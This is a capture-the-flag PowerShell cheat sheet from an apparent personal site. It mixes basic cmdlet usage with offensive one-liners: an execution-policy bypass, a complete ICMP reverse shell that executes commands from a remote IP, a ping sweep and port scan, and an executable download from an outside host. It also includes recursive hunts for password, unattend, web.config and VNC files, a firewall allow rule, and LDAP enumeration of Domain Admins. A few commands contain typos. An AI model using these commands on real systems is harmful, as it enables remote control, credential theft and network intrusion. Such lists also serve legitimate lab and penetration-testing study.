---
layout: page
title: CTF
permalink: /ctf/
---

PowerShell

```powershell
# Start a session without a profile and bypassing no execution
powershell.exe -nop -exec bypass


#Get a directory listing (ls, dir, gci):
Get-ChildItem


# Copy a file (cp, copy, cpi):
Copy-Item src dst


# Find text within a file:
Select-String -path c:\users\*.txt -pattern password
# or
ls -r c:\users -file | %{Select-String -path $_ -pattern password}


# Display file contents (cat, type, gc):
Get-Content file.txt


# Get current directory (pwd, gl):
Get-Location


# Get a process listing (ps, gps):
Get-Process


# Get a service listing:
Get-Service


# Formatting output of a command (Format-List, fl):
ls | Format-List -property name


# Paginating output:
ls -r | Out-Host -paging


# Get SHA1 hash of a file:
Get-FileHash -Algorithm SHA1 file


# Export output to CSV:
GetProcess | Export-Csv procs.csv


# Conduct a ping sweep:
1..255 | % (echo "10.10.10.$_"; ping -n 1 -w 100 10.10.10.$_ | Select-String ttl}


# icmp revshell
powershell -nop -c "$ip='your_ip'; $ic = New-Object System.Net.NetworkInformation.Ping; $po = New-Object System.Net.NetworkInformation.PingOptions; $po.DontFragment = $true; $ic.Send($ip,60*1000, ([text.encoding]::ASCII).GetBytes('OK'), $po); while ($true) { $ry = $ic.Send($ip,60*1000, ([text.encoding]::ASCII).GetBytes(''), $po); if ($ry.Buffer) { $rs = ([text.encoding]::ASCII).GetString($ry.Buffer); $rt = (Invoke-Expression -Command $rs | Out-String ); $ic.Send($ip,60*1000,([text.encoding]::ASCII).GetBytes($rt),$po); } }"


# Conduct a port scan:
1..1024 | % {echo ((new-object Net.sockets.TcpClient).Connect ("10.10.10.10",$_)) "Port is open!"} 2>$null



# Fetch a file via HTTP:
(New-Object System.Net.WebClient).DownloadFile("http://10.10.10.10/file.exe", "file.exe")

Invoke-WebRequest -Outfile C:\place\to\put http://IP/filetoget



# Find files with a specific name:
Get-ChildItem "C:\Users\" -recurse -include *passwords*.txt

Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}

Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue

Get-Childitem –Path C:\Users\ -Include *password*,*vnc*,*.config -File -Recurse -ErrorAction SilentlyContinue

Get-ChildItem C:\* -include *.xml,*.ini,*.txt,*.config -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password"



#Get a listing of all installed Microsoft Hotfixes:
Get-Hotfix


# Navigate the Windows Registry:
cd HKLM:\; ls
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\run`


# Convert String from ascii to Base64:
[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8GetBytes("PS Encode me!""))


# NETWORKING
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address

Get-DnsClientServerAddress -AddressFamily IPv4 | ft

Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex

Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State

Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse



# List and modify the windows firewall rules:
Get-NewFirewallRule -all

New-FirewallRule -Action Allow -DisplayName ItsaMe -RemoteAddress 10.10.10.99



# INFO ON CMDLETS/MODULES
Get-Help <cmdlet>

Get-Help <cmdlet> -detailed

Get-Help <cmdlet> -examples

Get-Help <cmdlet> -full

Get-Command -Module modulename



# Get-Command supports filtering. To filter cmdlets on the verb set:
Get-Command Set*

Get-Command –Verb Set

# Or on the noun process:
Get-Command *Process
 
Get-Command –Noun process



# Piping cmdlet output to another cmdlet:

Get-Process | Format-List –property name


# ForEach-Object in the pipeline (alias %):
ls *.txt | ForEach-Object {cat $_}

# Where-Object condition (alias where or ?):
Get-Process | Where-Object {$_.name –eq "notepad"}


# Generating ranges of numbers and looping:
1..10

1..10 | % {echo "Hello!"}


# Creating and listing variables:

$tmol = 42
ls variable:

# Examples of passing cmdlet output down pipeline:
dir | group extension | sort

Get-Service dhcp | Stop-Service -PassThru | Set-Service -StartupType Disabled

# ADDING MODULES TO SESSION

Import-Module C:\Path\to\name.ps1

#INVOKE COMMAND -ICM
Invoke-Command -ComputerName <name> -ScriptBlock {whoami}
$username = 'DOMAIN\USERNAME'; $password = 'PASSWORD'; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential $username,$securePassword; Invoke-Command -ComputerName BOX01 -Credential $credential -ScriptBlock {whoami};


#GET LANGUAGE MODE
$ExecutionContext.SessionState.LanguageMode


#x86 or x64
[IntPtr]::size


# ENVIRONMENT VARIABLES
Get-ChildItem Env: | ft Key,Value
$env:UserName

# CONNECTED DRIVES
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root


# LDAP
$username = 'lab.local\LDAP'; $password = 'PASSWORD'; $DomainControllerIpAddress = 'IP'; $LdapDn = 'DC=lab,DC=local'; $dn = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$($DomainControllerIpAddress):389/$LdapDn", $username, $password); $ds = New-Object System.DirectoryServices.DirectorySearcher($dn); $ds.SearchRoot;
# ...$ds.Filter ="((objectCategory=computer))"; $ds.FindAll();
# ...$ds.Filter ="((objectCategory=user))"; $ds.FindAll();
# ...$ds.filter = "(&(objectCategory=user)(memberOf=CN=Domain Admins,CN=Users,DC=lab,dc=local))"; $ds.FindAll();
# ...$ds.Filter ="((name=Administrator))"; $ds.FindAll().properties;
# ...$ds.Filter ="((name=Bob*))"; $ds.FindAll().properties;


#UAC
$secpasswd = ConvertTo-SecureString "1234test" -AsPlainText -Force; $mycreds = New-Object System.Management.Automation.PSCredential ("Administrator", $secpasswd); $computer = "BOXNAME"; [System.Diagnostics.Process]::Start("C:\temp\file.bat",$mycreds.Username,$mycreds.Password,$computer)
```



